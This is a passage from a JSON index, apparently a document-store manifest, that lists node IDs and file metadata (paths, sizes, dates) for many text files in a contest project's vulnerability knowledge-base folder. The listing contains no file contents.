"file_type": "text/plain", "file_size": 908, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "b5e0e9d6-2d0e-485c-9f93-171496c02e66": {"node_ids": ["b172502d-aee8-43ca-90c8-6754e6b3ebab"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_269950.txt", "file_name": "20250408_175638_269950.txt", "file_type": "text/plain", "file_size": 1802, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "c102483a-9c35-48a9-addb-9fc42ff504c4": {"node_ids": ["7c8ce9ff-43bb-44c1-be05-e80b05d47e9d", "c41fddaf-0cf5-42ca-9980-39bba487978d"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_393408.txt", "file_name": "20250408_175640_393408.txt", "file_type": "text/plain", "file_size": 7303, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "6536a3a7-0601-46f8-9618-3b748bc1f657": {"node_ids": ["c835a5f4-001a-4664-92d3-0a61980be2e9"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_426701.txt", "file_name": "20250408_175640_426701.txt", "file_type": "text/plain", "file_size": 2645, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "e271e3aa-230e-43de-9f6d-d863a8312299": {"node_ids": ["4ccabeb3-7d4a-4665-a063-e9381968fea8"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_459236.txt", "file_name": "20250408_175640_459236.txt", "file_type": "text/plain", "file_size": 2661, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "4bbe6897-99da-4eaa-bcf2-eaee9babb827": {"node_ids": ["85c84d10-d39b-47cc-bd80-20237f208430"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_499643.txt", "file_name": "20250408_175640_499643.txt", "file_type": "text/plain", "file_size": 681, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "023d277a-eb7f-44aa-bc45-736b77eb9e8b": {"node_ids": ["68b5488b-4fed-4618-8b18-0cd708e9a44a"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_532452.txt", "file_name": "20250408_175640_532452.txt", "file_type": "text/plain", "file_size": 851, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "16823b45-b6ef-4128-9ffa-2304de5d83e5": {"node_ids": ["da2109a6-d1a4-4347-a253-b3624cb1bc2f", "769f4554-3416-4f67-a669-c20f5fb54eb2"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_562711.txt", "file_name": "20250408_175640_562711.txt", "file_type": "text/plain", "file_size": 5076, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "4d0b0ad4-f993-4b18-bbce-7d5d804d13ab": {"node_ids": ["3b4071f7-1281-4648-ad02-13f5deee3924"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_660731.txt", "file_name": "20250408_175642_660731.txt", "file_type": "text/plain", "file_size": 3734, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "5b2bfec0-7668-43f3-b767-df270b44b271": {"node_ids": ["544bfb60-513e-46a9-84ac-6af751bd793a"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_691964.txt", "file_name": "20250408_175642_691964.txt", "file_type": "text/plain", "file_size": 1352, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "c2a3a186-58d6-4cea-9c71-460ed5ce6531": {"node_ids": ["4c71deb6-3602-45f9-8387-97ee376a8c9c"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_755233.txt", "file_name": "20250408_175642_755233.txt", "file_type": "text/plain", "file_size": 1423, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "b0f9bd5f-c05b-4d41-99b9-9d7acde949af": {"node_ids": ["f89fbf74-9911-4f14-a8ee-965d2d7a1565"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_797159.txt", "file_name": "20250408_175642_797159.txt", "file_type": "text/plain", "file_size": 2655, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "42410e12-a60a-4737-a944-b2aca4de4282": {"node_ids": ["2f4d7581-7733-4ee3-8d6f-42244a04365f", "981b5c60-d621-4485-8c44-50dee3eac023"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_833802.txt", "file_name": "20250408_175642_833802.txt", "file_type": "text/plain", "file_size": 4011, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "920aa792-28cb-4fa9-b09e-72482eededd2": {"node_ids": ["e97a3d2c-a96d-4d39-bd8e-d8503f877996"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_865163.txt", "file_name": "20250408_175642_865163.txt", "file_type": "text/plain", "file_size": 2515, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "dadfc12e-71af-4507-8697-d01e17d37f9e": {"node_ids": ["2f7ac366-2c49-4c01-a0a4-746127f91343"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175644_985957.txt", "file_name": "20250408_175644_985957.txt", "file_type": "text/plain", "file_size": 883, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "96afaff2-0c9f-4592-ae22-cb2160815cbf": {"node_ids": ["e102c32d-22b6-47b0-92c3-06dcd7e26666"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175645_017204.txt", "file_name": "20250408_175645_017204.txt", "file_type": "text/plain", "file_size": 3799, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "27eb8e21-c697-4749-8f32-5d43a2dbeb0d": {"node_ids": ["9a0af945-0c3b-40f8-b9d7-4846e25c1986"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175645_048674.txt", "file_name": "20250408_175645_048674.txt", "file_type": "text/plain", "file_size": 1732, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "4f454957-0da8-4138-bc5e-10cd78c3aa21": {"node_ids": ["1f62e9b4-d9ac-4492-8aaf-219c53516252"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175645_127626.txt", "file_name": "20250408_175645_127626.txt", "file_type": "text/plain", "file_size": 2779, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "4e6c12d6-02d1-462d-ad20-be31f3fdeb15": {"node_ids": ["adff1f21-3f0f-4b50-8346-9f29de097fed"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175645_174735.txt", "file_name": "20250408_175645_174735.txt", "file_type": "text/plain", "file_size": 3358, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "1fa24f1e-a3cc-4a19-b774-5389fd9ac055": {"node_ids": ["1ca5b965-e735-4ba2-b0d9-c61ec0b724a9"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_290088.txt", "file_name": "20250408_175647_290088.txt", "file_type": "text/plain", "file_size": 2646, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "1e533b1d-7938-4e8b-95d8-89738d2a994e": {"node_ids": ["39dfe8f4-67ea-46b7-a46a-0e84af8ac29f"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_325985.txt", "file_name": "20250408_175647_325985.txt", "file_type": "text/plain", "file_size": 2022, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "30980c54-9bb4-40fa-b53d-0f2f50ee0925": {"node_ids": ["fe8301b6-dd5d-4230-a275-3770863810e0"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_369037.txt", "file_name": "20250408_175647_369037.txt", "file_type": "text/plain", "file_size": 2822, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "8b3472ef-41f3-4fd8-9fbb-1c1d3cee9f79": {"node_ids": ["45ac56f2-6645-49ff-aa03-54dec9754be6", "ea8230f8-6322-437c-92bc-5038e1f5cb25"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_400945.txt", "file_name": "20250408_175647_400945.txt", "file_type": "text/plain", "file_size": 5345, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "6574cb40-9ac3-49ad-9751-81c00736ac61": {"node_ids": ["8920fceb-b70a-4fdd-87ca-3a2ddcee4333"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_450260.txt", "file_name": "20250408_175647_450260.txt", "file_type": "text/plain", "file_size": 1641, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "b364a1bd-be12-4360-8a87-6afe2ec8003c": {"node_ids": ["7af79901-0e8d-47da-95ba-214122fbc194", "339e5f4d-8538-4716-a1ac-87f50d0df7d3"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_483250.txt", "file_name": "20250408_175647_483250.txt", "file_type": "text/plain", "file_size": 7346, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "73438241-b85b-4f2a-81d4-ec965df349a4": {"node_ids": ["bc97e67a-8605-4a3b-b618-00941455e9b7"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_582730.txt", "file_name": "20250408_175649_582730.txt", "file_type": "text/plain", "file_size": 1207, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "c215f6d6-4245-463d-99d4-966189f3afcc": {"node_ids": ["fd802492-a598-486c-96b2-c6f63a0e16df", "17316681-6200-47a2-8ea8-9ea967eea101", "fecbb84f-a34a-40cd-825c-81f4998cbc4b"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_629907.txt", "file_name": "20250408_175649_629907.txt", "file_type": "text/plain", "file_size": 11255, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "dc8f8c68-ea3a-498f-8325-72d9b4aff3fe": {"node_ids": ["8dbc1279-d151-4c8e-8419-93354d109408"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_661763.txt", "file_name": "20250408_175649_661763.txt", "file_type": "text/plain", "file_size": 1649, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "87d5ce76-ecfe-49cd-8d1a-6f70116e8ecc": {"node_ids": ["4ce776c3-3a3d-4611-b73f-6c1a00074b4a", "19f01f00-2344-40e1-ab2c-573af47d6e48"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_693170.txt", "file_name": "20250408_175649_693170.txt", "file_type": "text/plain", "file_size": 4825, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "f11cb73d-ec59-49e3-8391-7adc4aaccd2c": {"node_ids": ["8ec85144-1ce0-460d-9cc5-78e8433192af", "14929813-ff0d-4d70-8bc6-d39b1380b98a"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_740770.txt", "file_name": "20250408_175649_740770.txt", "file_type": "text/plain", "file_size": 5610, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "fdb1493f-c273-40b9-ba6e-a9adf26a6d24": {"node_ids": ["8e3fb50b-6f39-4382-941e-483470e0d4fd"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_772253.txt", "file_name": "20250408_175649_772253.txt", "file_type": "text/plain", "file_size": 1208, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "a8345bde-297f-4740-81c4-df05ce25fe03": {"node_ids": ["616c1a41-265c-4f55-917f-77ac86a8f2d5"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175651_898817.txt", "file_name": "20250408_175651_898817.txt", "file_type": "text/plain", "file_size": 2789, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "3b68f9e9-7843-456f-8a25-0233e692a9cc": {"node_ids": ["edc858c7-4844-4e03-9da9-85f54c704919"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175651_934235.txt", "file_name": "20250408_175651_934235.txt", "file_type": "text/plain", "file_size": 3002, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "963596af-a032-4fbd-8503-515ddb4fc969": {"node_ids": ["63c6b2c6-2da6-445a-b570-6982a64650a3"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175651_978034.txt", "file_name": "20250408_175651_978034.txt", "file_type": "text/plain", "file_size": 1151, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "c7dc7433-d0eb-48e8-acc7-fcec7e76c7b0": {"node_ids": ["1cf868ad-75a8-4aa6-9d4f-0844628cb925"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175652_011090.txt", "file_name": "20250408_175652_011090.txt", "file_type": "text/plain", "file_size": 3274, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "18c3ac27-a884-455b-a17a-8d974f54dd18": {"node_ids": ["4dc21662-3ae0-4006-9253-f0d7be64f107"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175652_047181.txt", "file_name": "20250408_175652_047181.txt", "file_type": "text/plain", "file_size": 1012, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "6b7a3f2a-260e-494b-bba7-0b07c7921c4e": {"node_ids": ["e9818ef0-f2f0-435e-8266-07b351a89d99"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175652_094133.txt", "file_name": "20250408_175652_094133.txt", "file_type": "text/plain", "file_size": 918, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "c302a78e-9a8e-4671-b8b4-6dd2d2ff21dc": {"node_ids": ["35859147-247b-47b0-adda-797f40787f81"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_211238.txt", "file_name": "20250408_175654_211238.txt", "file_type": "text/plain", "file_size": 1258, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "c3d1ce14-6cb9-4818-89b6-904575e226cd": {"node_ids": ["6df7e07d-0137-4cca-8d2f-6e55e91948d7"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_243902.txt", "file_name": "20250408_175654_243902.txt", "file_type": "text/plain", "file_size": 2242, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "0e41de41-abb0-4146-a3f7-3d568290221f": {"node_ids": ["e865073e-ef16-4d89-b490-f055dabb8681"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_277048.txt", "file_name": "20250408_175654_277048.txt", "file_type": "text/plain", "file_size": 3156, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "1d5666f6-2915-4572-9244-6b6ecd146d15": {"node_ids": ["14007516-4e91-4e5b-bfdc-b2b306f25ce7"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_307170.txt", "file_name": "20250408_175654_307170.txt", "file_type": "text/plain", "file_size": 2312, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "2b655e01-c3c1-4012-bb8e-22360990e6b0": {"node_ids": ["14d104f9-ea53-404a-b164-7c4b38083ddb"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_354319.txt", "file_name": "20250408_175654_354319.txt", "file_type": "text/plain", "file_size": 1562, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "c85d4846-af91-4d6e-a70f-36e1502f6a33": {"node_ids": ["c3f473a7-5d50-401d-984e-f43afd698468"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_385791.txt", "file_name": "20250408_175654_385791.txt", "file_type": "text/plain", "file_size": 3617, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "4487435c-303a-49c8-9439-b97285067e8e": {"node_ids": ["87a87626-408a-4e96-81af-42b5785479d4"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_491339.txt", "file_name": "20250408_175656_491339.txt", "file_type": "text/plain", "file_size": 1740, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "895bab1a-3c52-4817-8561-0fcf869882aa": {"node_ids": ["b5b0a15c-d961-4cd7-bd66-7d7640cd0865"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_523326.txt", "file_name": "20250408_175656_523326.txt", "file_type": "text/plain", "file_size": 2510, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "be9c74f3-8935-4ea4-95d2-828c0b360eb5": {"node_ids": ["ff6f390f-3943-40e0-bd72-6444d67f823a", "7d85d6f5-8d03-412f-981a-1e628391d9f4"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_554567.txt", "file_name": "20250408_175656_554567.txt", "file_type": "text/plain", "file_size": 5465, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "a51f5a34-816a-4051-8e10-150bd3f01e7b": {"node_ids": ["4371f9be-066c-42f1-b3e6-325e120ae83f"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_601802.txt", "file_name": "20250408_175656_601802.txt", "file_type": "text/plain", "file_size": 3983, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "36a35c90-fdda-4d19-a246-184ea7945dad": {"node_ids": ["4c6a70de-e167-4836-a53e-02db41a8c6cb"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_633215.txt", "file_name": "20250408_175656_633215.txt", "file_type": "text/plain", "file_size": 1553, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "74d9bff8-98af-4bdf-bf8d-bba69cabd6b9": {"node_ids": ["02641c1d-995b-47d5-85a5-fa20a394b757"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_664605.txt", "file_name": "20250408_175656_664605.txt", "file_type": "text/plain", "file_size": 3640, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "96f4886e-da68-4538-8db9-165311fb9b71": {"node_ids": ["151b8663-8455-4d26-8dc9-ae7df7104dbd", "5b0409b7-79c2-4018-b318-1dd8088bc10c"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_772653.txt", "file_name": "20250408_175658_772653.txt", "file_type": "text/plain", "file_size": 5442, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "e85c1ce5-9e61-4cb2-ac5e-3341b93ce5cf": {"node_ids": ["b81b570e-8eaa-46a1-b7a6-5208e01e8090"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_804230.txt", "file_name": "20250408_175658_804230.txt", "file_type": "text/plain", "file_size": 1585, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "5a11ab77-d730-4737-97e4-0e94c752af01": {"node_ids": ["8021fd5d-ec7b-49d5-bb63-b25a920dbcc0"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_865168.txt", "file_name": "20250408_175658_865168.txt", "file_type": "text/plain", "file_size": 1542, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "440cf506-8894-451f-921e-ffd81cb06f82": {"node_ids": ["873897d9-6e8a-4a23-931b-4fc11092b26f"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_899111.txt", "file_name": "20250408_175658_899111.txt", "file_type": "text/plain", "file_size": 2057, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "6766760c-589c-474f-8ada-3e1995bdfaa1": {"node_ids": ["69511f88-80d1-487d-97d8-b1a206ff05d8"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_930540.txt", "file_name": "20250408_175658_930540.txt", "file_type": "text/plain", "file_size": 1724, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "d2f83b4d-8c77-404f-bc10-3340ce7a5717": {"node_ids": ["d3c78e04-4164-4eef-9222-c93453c31c6f"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_962207.txt", "file_name": "20250408_175658_962207.txt", "file_type": "text/plain", "file_size": 3466, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "a475e062-4680-4817-ada9-8b9172e5d14c": {"node_ids": ["2461d92c-7436-49b0-8947-b0bc0751ab94"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_072076.txt", "file_name": "20250408_175701_072076.txt", "file_type": "text/plain", "file_size": 3421, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "e109ca46-30b3-4a43-99f7-6cdeebb7648f": {"node_ids": ["44a75834-e9ba-44ca-aa2c-d767ef06d5ce"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_103526.txt", "file_name": "20250408_175701_103526.txt", "file_type": "text/plain", "file_size": 1552, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "b9fa964e-8184-4a91-a33b-114343d438e0": {"node_ids": ["61303b7b-e3a6-49c1-a645-1fafe2c3f5de", "7046e90b-5885-47da-9090-6df80c0d95d1", "60db438d-0758-4d43-9539-4437737af871", "8935791f-c72f-44d8-93cf-e573c7e740ab", "0c1db893-9181-40aa-81ab-40f7cf6bd643"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.txt", "file_name": "20250408_175701_150694.txt", "file_type": "text/plain", "file_size": 13689, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "1d46afa4-ccc6-421c-9628-d33ca49309fb": {"node_ids": ["4e78950d-2b59-47bf-bbbd-d627a775464e"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_182221.txt", "file_name": "20250408_175701_182221.txt", "file_type": "text/plain", "file_size": 3910, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "e862f6c7-60ae-41c4-9d8f-4b63f4ae461d": {"node_ids": ["42ea0ff1-9692-4f4a-a991-dcdd94b88766"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_229442.txt", "file_name": "20250408_175701_229442.txt", "file_type": "text/plain", "file_size": 1470, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "732f8371-e2f8-43f4-82e0-c5be41df060d": {"node_ids": ["0f5f2137-5ea2-42b4-babc-40e2281b9c62"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_291889.txt", "file_name": "20250408_175701_291889.txt", "file_type": "text/plain", "file_size": 2266, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "00452626-e686-4fd0-aaef-6c94b4a53ecf": {"node_ids": ["d23e4ff0-621c-41bc-ac65-1f9c25100a62"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_419142.txt", "file_name": "20250408_175703_419142.txt", "file_type": "text/plain", "file_size": 1659, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "356064ba-2a01-45e1-abac-af478c5f5f54": {"node_ids": ["dd1fd101-f34e-4652-9422-bc8af4d92161"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_466234.txt", "file_name": "20250408_175703_466234.txt", "file_type": "text/plain", "file_size": 1022, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "b1e5d45f-7774-43a7-9b9b-e5a1dbe4e42e": {"node_ids": ["4761fa97-9da4-4739-950a-1344742d487d", "d00909c2-1cc8-454c-87a5-8efa41bc4b2e"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_529990.txt", "file_name": "20250408_175703_529990.txt", "file_type": "text/plain", "file_size": 4791, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "2e6ad1d1-039b-4708-8ac5-dd5ec5203b1b": {"node_ids": ["c6b5f50a-4abb-45c8-b3f1-87923571cc49"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_561128.txt", "file_name": "20250408_175703_561128.txt", "file_type": "text/plain", "file_size": 3335, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "3fbc53f0-bb13-44e1-8062-aa37dba76f8f": {"node_ids": ["10d61ed7-2e95-4585-aeb9-02b5b1022b3b"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_608027.txt", "file_name": "20250408_175703_608027.txt", "file_type": "text/plain", "file_size": 3576, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "61d5256c-c6b3-4fc1-bd32-8d00fd981a57": {"node_ids": ["e2db8286-eb89-43c0-82ea-ce429e67f439"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_655288.txt", "file_name": "20250408_175703_655288.txt", "file_type": "text/plain", "file_size": 3696, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "c3653e3e-2069-4f89-92dd-13429081a53e": {"node_ids": ["82493a88-9907-46b4-be03-46732cc51be3"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_765733.txt", "file_name": "20250408_175705_765733.txt", "file_type": "text/plain", "file_size": 2619, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "57c8e63b-7396-4653-9184-2dd505bd169b": {"node_ids": ["382edd58-e745-4a53-a869-d5bfe6f85576"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_797358.txt", "file_name": "20250408_175705_797358.txt", "file_type": "text/plain", "file_size": 1734, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "990921b8-9814-466f-8b99-54ea64cf0433": {"node_ids": ["c28ef5eb-973b-498c-91c7-19ff6ebdad05"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_828683.txt", "file_name": "20250408_175705_828683.txt", "file_type": "text/plain", "file_size": 2288, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "3f327e6f-f253-4738-9c1a-4374d1f2b733": {"node_ids": ["a6a88632-d684-4123-9a08-daac48c9d3d2"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_860089.txt", "file_name": "20250408_175705_860089.txt", "file_type": "text/plain", "file_size": 3146, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "c3def46c-86ea-43b8-995c-e1ad40596e1f": {"node_ids": ["aa99bc5c-bddd-4507-adf0-e40fb06b3e9e"], "metadata": {"file_path": 